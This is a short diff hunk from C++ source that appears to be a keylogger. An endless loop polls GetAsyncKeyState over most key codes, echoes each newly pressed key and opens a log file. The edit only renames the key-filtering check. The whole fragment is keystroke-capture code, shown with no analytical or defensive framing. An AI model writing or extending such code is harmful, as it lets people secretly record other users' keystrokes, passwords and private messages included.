@@ -55,7 +55,7 @@ while(TRUE){
 	Sleep(10);
 	for(key = 8; key<=190;key++){
 		if(GetAsyncKeyState(key) == -32767){
-			if(KeyIsListed(key) == FALSE){
+			if(keys->CheckListKey(key) == FALSE){
 				cout<<key;
 				ofstream file;
 				file.open(filename);
